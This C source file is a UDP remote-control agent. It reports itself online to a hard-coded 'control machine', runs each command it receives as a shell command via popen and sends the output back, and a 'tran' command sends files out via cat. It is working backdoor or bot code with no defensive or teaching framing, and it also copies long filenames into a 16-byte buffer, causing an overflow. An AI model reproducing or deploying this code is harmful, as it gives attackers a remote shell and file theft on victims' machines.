#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PORT 1235
#define LENGTH  512
struct sockaddr_in control_add;
struct sockaddr_in remote_add;
static int run = 1;   // Thread running state
int sockfd;
int length = LENGTH;
char datagram[LENGTH];

void *start_routine(void *arg) {
    int z;
    while(1) {
        bzero(datagram, LENGTH);
        z = recvfrom(sockfd, datagram, LENGTH, 0, (struct sockaddr *)&control_add, &length);
        if (z == -1) {
            printf("ERR_recvfrom: %s\n", strerror(errno));
        }
        else if (strcmp(datagram, "ok") == 0) {
            run = 0;
            pthread_exit(0);
        }
    }
}

int sendOnline() {
    int x;
    x = sendto(sockfd, "ok", 2, 0, (struct sockaddr *)&control_add, sizeof(control_add));
    if (x == -1) {
        printf("ERR_sendto: %s\n", strerror(errno));
        exit(-1);
    }
    return 0;
}

int main(int argc, char const *argv[]) {
    int x, z, ret;
    char *control_ip = "127.0.0.1";
    char command[16], path[128], filename[256];
    pthread_t thread;

    FILE *fp;  // it will open a stream for the output of command

    // Initialize the host machine
    // popen("chmod 755 *", "r");
    // popen("./init.sh", "r");

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    bzero(&control_add, sizeof(control_add));
    control_add.sin_family = AF_INET;
    control_add.sin_port = htons(PORT);
    control_add.sin_addr.s_addr = inet_addr(control_ip);

    while(1) {
        // Send on-line information to the control machine
        while(run) {
            if (run == 1) {
                puts("Waiting for connection...");
                ret = pthread_create(&thread, NULL, (void*)start_routine, NULL);
                if (ret != 0) {
                    printf("ERR_pthread: %s\n", strerror(errno));
                    exit(-1);
                }
            }
            sendOnline();
            run = 2;
            sleep(1);
        }

        puts("Waiting for command...");
        bzero(datagram, LENGTH);

        // Here we are waiting for receiving command from the control machine
        z = recvfrom(sockfd, datagram, LENGTH, 0, (struct sockaddr *)&control_add, &length);
        if (z == -1) {
            printf("ERR_recvfrom: %s\n", strerror(errno));
            exit(-1);
        }

        datagram[z] = 0;
        printf("Command:%s", datagram);

        sscanf(datagram, "%[^ ]", command);
        // use function chdir() to replacement command 'cd'
        if (strcmp(command, "cd") == 0) {
            bzero(command, sizeof(command));
            sscanf(datagram, "%*3s%s", path);
            if (chdir(path) == -1) {
                printf("Chdir: %s\n", strerror(errno));
            }else {
                fp = popen("pwd", "r");
            }
            bzero(path, sizeof(path));
        }
        // Continue to send on-line message
        else if (strcmp(command, "quit\n") == 0) {
            bzero(command, sizeof(command));
            run = 1;
        }
        // transfer file to the control machine
        else if (strcmp(command, "tran") == 0) {
            bzero(command, sizeof(command));
            // ...
            sscanf(datagram, "%*5s%s", filename);
            strcpy(command, "cat ");
            strcat(command, filename);
            fp = popen(command, "r");
            bzero(command, sizeof(command));
        }else
            fp = popen(datagram, "r");  // opening a stream by executing the command
        bzero(datagram, sizeof(datagram));


        // collecting the output and sending to the control machine
        while(fgets(datagram, sizeof(datagram)-1, fp) != NULL) {
            x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
            if (x == -1) {
                printf("ERR_sendto: %s\n", strerror(errno));
                exit(-1);
            }

            bzero(datagram, sizeof(datagram));
        }
        // marking the end of output of command
        strcpy(datagram, "___EOF___\n");
        x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
        if (x == -1) {
            printf("ERR_sendto:%s\n", strerror(errno));
            exit(-1);
        }
    }
    close(sockfd);
    return 0;
}
